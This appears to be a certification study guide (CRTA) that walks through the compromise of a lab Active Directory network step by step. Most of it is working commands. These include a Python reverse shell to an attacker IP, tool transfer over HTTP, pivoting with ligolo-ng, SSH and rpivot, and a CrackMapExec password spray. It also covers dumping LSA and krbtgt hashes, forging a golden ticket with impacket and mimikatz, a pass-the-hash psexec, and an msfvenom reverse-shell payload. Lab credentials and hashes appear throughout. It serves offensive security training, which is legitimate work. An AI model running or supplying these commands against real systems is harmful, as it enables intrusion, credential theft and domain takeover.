# CRTA Guide

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

| Network         | Description      |
| --------------- | ---------------- |
| 192.168.80.0/24 | External Network |
| 192.168.98.0/24 | Internal Network |

## Initial Access to Linux Web Server

### Host Discovery

Scanning available host

```bash
nmap -sn 192.168.80.0/24
```



### Port Scanning

```bash
nmap -sC -sV 192.168.80.10
```



### Web Enumeration

Now sign in to the site and using **Burp Proxy** (HTTP history) navigate through the website to discover interesting request.

Then, check the possible Command Execution in the all website input field.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

First, check the /etc/passwd file for possible clear-text credentials or hash of other priv users.

Otherwise get a Reverse shell (Python, Bash, ...)

{% code overflow="wrap" %}
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.200.56",9009));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
{% endcode %}



## Linux Machine Enumeration

### Linpeas enum

Once we have access to the machine, using LinPeas to get information

<pre class="language-bash"><code class="lang-bash"><strong># copy linpeas.sh and run this on att machine
</strong><strong>python3 -m http.server
</strong>
wget http://IP/linpeas.sh
chmod +x lin.sh
./lin.sh
</code></pre>

### Juicy File

In a linux machine we can find some windows credentials in some log files like these:

```bash
cat .vnc_log
cat .mysql_history
```

### Network configuration

Now, we can check the machine's network configuration to look up for another network interface.

```bash
ifconfig
```

### Mozilla Firefox History/Bookmarks

If there is Mozilla Firefox installed for this user we can try to extract the history and bookmarks looking for other interesting informations.

```bash
ls -la .mozilla/
cd .mozilla/firefox/...default-release

sqlite3 places.sqlite
.tables
SELECT * FROM moz_bookmarks;
```

We can found credentials and more. If we found some creds let's to the next step.



## Pivoting from DMZ to Internal Network



<details>

<summary>Ligolo-ng</summary>

### Ligolo-ng

We have to perform pivoting as `192.168.98.0/24` is not directly accessible&#x20;from the VPN network. We will utilize ligolo-ng for the same.

<pre class="language-bash"><code class="lang-bash"># Attacker machine, download proxy &#x26; agent

#Proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_pr
oxy_0.4.3_Linux_64bit.tar.gz
<strong>
</strong><strong>#Agent
</strong>wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_ag
ent_0.4.3_Linux_64bit.tar.gz

# host the directory to trasfer file into target machine
python3 -m http.server 8080
</code></pre>

Transfer and set up all in the target machine

<pre class="language-bash"><code class="lang-bash"><strong># Target Machine
</strong><strong>
</strong><strong>wget http://10.10.200.56:80/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
</strong>tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
</code></pre>

Now, setup the attacker machine with ligolo-ng proxy

<pre class="language-bash"><code class="lang-bash"># Attacker Machine

sudo ip tuntap add user &#x3C;YOUR_USER> mode tun ligolo

# Delete the 192.168.98.0/24 IP Range from the tun0 interface :
sudo ip route del 192.168.98.0/24 dev tun0

# Up the ligolo interface:
<strong>sudo ip link set ligolo up
</strong>
# Add 192.168.98.0/24 IP range to the ligolo interface:
sudo ip route add 192.168.98.0/24 dev ligolo

# Check if the route has been added
ip route
</code></pre>

Then, start the proxy server

```bash
# Attacker machine

./proxy -selfcert -laddr 0.0.0.0:443
```

And lastly connect the agent into target machine to the server into attacker machine

<pre class="language-bash"><code class="lang-bash"><strong># Target machine
</strong><strong>
</strong><strong>./agent -connect 10.10.200.X:443 -ignore-cert
</strong></code></pre>

When the connection has been initialized, start the tunnel from ligolo interface on attacker machine.

```bash
# Ligolo interface on attacker machine

session # (select the current connection)
start
```

Now we can ping the network 192.168.98.0/24

```bash
ping 192.168.98.15
```

</details>

<details>

<summary>SSH Tunneling</summary>

### SSH Tunneling

Once we have access to a machine with SSH credential we can create a tunnel to connect our machine to other networks.

Establish the tunnel on a local port

```bash
sudo apt install proxychains

ssh -D $LOCAL_PORT $USER@$VICTIM1_IP
# ex ssh -D 8090 mario@192.168.3.2
```

Once we have the tunnel established, we have modify our proxy file and add this port.

```bash
nano /etc/proxychains.conf

# add follow line in the bottom
socks5 127.0.0.1 8090
socks4 127.0.0.1 8090
```

Now using `proxychains` we can access to all port of all other network machines.

```bash
# this command to create a port fordward which allow us to see a web page
proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2

# use nmap through the pivoting
proxychains nmap -sT 192.168.98.30

# this command allow us to access via RDP to other machine in other network
proxychains rdesktop $VICTIM2_IP
```

</details>

<details>

<summary>Rpivot</summary>

### Rpivot

_RPIVOT allows to tunnel traffic into internal network via socks 4. It works like ssh dynamic port forwarding but in the opposite direction. Target machine as client and attack machine as server._

This tool is usefull when we have access to a machine through web rev shell but **we do not have the credentials** to make a SSH tunneling.

```bash
git clone https://github.com/klsecservices/rpivot
```

This tool works with Python2, to running it we can create a virtual env with conda

{% code overflow="wrap" %}
```bash
cd rpivot
conda create -n rpivot python=2.7

# Start the server on attacker machine
python2 server.py --server-port $SERVER_PORT --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port $PROXY_PORT # (ex SERVER_PORT = 9980 and PROXY_PORT 9050)
# server_port = expose port from receiving client connection
# proxy_port = port which will be use by proxychains

#ex
python2 server.py --server-port 8899 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
```
{% endcode %}

Now we have to transfer the rpivot .zip directory to target machine

```bash
# attack machine in the dir where there is rpivot.zip
python3 -m http.server 80

# target machine
wget http://$ATT_IP/rpivot.zip
```

Check if in the target machine there is python2 installed and run the connection to the server.

```bash
# target machine
python --version # check python version

# conect to the rpivot server
python client.py --server-ip $ATT_IP --server-port $SERVER_PORT

#ex
python2 client.py --server-ip 10.10.200.56 --server-port 8899
```

When the connection has been initialized, we have to add this configuration to proxychain conf file.

```bash
nano /etc/proxychains.conf

# add follow line in the bottom and COMMENT the socks5 if there is it
socks4 127.0.0.1 $PROXY_PORT
```

Now using `proxychains` we can access to all port of all other network machines.

```bash
# this command to create a port fordward which allow us to see a web page
proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2

# use nmap through the pivoting
proxychains nmap -sT $VICTIM2_IP

# this command allow us to access via RDP to other machine in other network
proxychains rdesktop $VICTIM2_IP

# pivot network discovery
proxychains nmap -sn 192.168.98.15/24
```

</details>







## Initial Access to Windows Machine/DC

Scan to detect active machine in the pivoting network with nmap or arpscan

```bash
# nmap scan
nmap -sn 192.168.98.0/24

# arp scan
netdiscover -i INTERFACE -r IP/MASK
```

Port Scan

```bash
nmap -sT 192.168.98.30
```

### Password Spray with found credentials

With the AD credentials found in the Firefox Bookmarks we can try to perform a password spray to host discovered.

Let's create a file with all live host in the network.

{% code title="target.txt" %}
```bash
# create a file with all host discovered
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120
```
{% endcode %}

Perform the spray with Crackmapexec

```bash
crackmapexec --verbose smb target.txt -u john -p 'User1@#$%6'
```

If we get a result with `(Pwn3d!)` writing, it mean that this user is local administrator at the machine.



### Windows Machine dump credentials

Now we can perform a dump of credentials stored in that machine.

```bash
crackmapexec --verbose smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa

impacket-secretsdump $DOMAIN.COM/$USER:$PASS@$DC_IP
```

Then if we will find other credentials we can repeform a password spray.

<pre class="language-bash"><code class="lang-bash"><strong>crackmapexec --verbose smb target.txt -u corpmngr -p 'User4&#x26;*&#x26;*'
</strong></code></pre>

If we get a result with `(Pwn3d!)` writing, it mean that this user is local administrator at the machine.

Since we know the machine name & the domain, let’s update the same on&#x20;our `/etc/hosts` file.

```bash
sudo nano /etc/hosts

192.168.98.2 warfare.corp dc01.warfare.corp
192.168.98.120 child.warfare.corp cdc.child.warfare.corp
```



### Craft a Golden Ticket

#### Get Domain infomation

Get a shell with evil-winrm and run this commands on a Windows Machine:

```powershell
nltest /trusted_domains
nltest /dclist:parent.com
```

#### Get KRBTGT Hash

We are local administrator in the Child Domain Controller. Let's extract the&#x20;hash of “**krbtgt**” account using `impacket-secretsdump` tool. We will forge&#x20;a golden ticket to compromise the Parent Domain Controller.

{% code overflow="wrap" %}
```bash
impacket-secretdump -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'

# Results:

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900

krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
```
{% endcode %}

#### Get SID of the Child and Parent DC

Using `impacket-lookupsid` tool we will extract DC SIDs

```bash
impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp

impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
```

#### Forge the ticket

Using `impacket-ticketer` tool we will craft the golden ticket.

{% code overflow="wrap" %}
```bash
impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid $CHILD_DC_SID -groups 516 -user-id 1106 -extra-sid $PARENT_DC_SID,S-1-5-9 'corpmngr'
```
{% endcode %}

Now we have the `.ccache` file. Let's set it to the env variable

```bash
export KRB5CCNAME=corpmngr.ccache
```

<details>

<summary>Mimikatz Ticket craft</summary>

{% code overflow="wrap" %}
```powershell
.\mimi.exe

kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID /sids:$PARENT_DOMAIN_SID-519 /aes256:$KRBTGT_AES256 /startoffset:-5 /endin:600 /renew:10080 /ptt

# using Ticketer
impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
```
{% endcode %}

Check the tickets in the session

```
klist
```

</details>

### Get Service Ticket with .ccache file

Now, using impacket-getST we can request Service Ticket using ccache file.

{% code overflow="wrap" %}
```bash
impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
```
{% endcode %}

Now set the new Ticket just created to our env variable

```bash
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```





## Parent Domain Controller Compromise

We got the CIFS ticket of the Domain Controller as “**corpmngr**”, let’s extract&#x20;the **Administrator password** using `impacket-secretsdump` tool.

{% code overflow="wrap" %}
```bash
impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator' -debug
```
{% endcode %}

If it works, we can use the Administrator hash to access through SMB using `impacket-psexec`&#x20;

{% code overflow="wrap" %}
```bash
impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60
```
{% endcode %}

Now we have comprimise the Entire Domain. ;)



## Enumeration Windows Machine

### Information target

```powershell
net user /dom

net group /dom
```



### Create MSFvenom payload to stable shell

To upgrade the shell we can craft a msfvenom payload and execute it in the target machine.

{% code overflow="wrap" %}
```bash
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=$ATT_IP LPORT=$PORT -f exe -o rev.exe
```
{% endcode %}

Transfer the file to target machine

```bash
# target machine
iwr http://$ATT_IP/rev.exe -OutFile C:\Tmp\rev.exe

certutil -urlcache -f http://IP:PORT/rev.exe rev.exe
```

Set a listener and then run the executable

```bash
# attacker machine
nc -nvlp $PORT

# target machine
cd C:\Tmp
.\rev.exe
```

Now we have a stable shell



### PowerView

```powershell
iwr http://$ATT_IP:PORT/PowerView.ps1 -OutFile C:\Users\...\pv.ps1

powershell -ep bypass
import-module .\pv.ps1
```

<pre class="language-powershell"><code class="lang-powershell"><strong># get the ad trust information
</strong><strong>Get-ADTrust -Filter * 
</strong>Get-DomainTrust -Filter *

# get forest information
Get-ADForest
</code></pre>



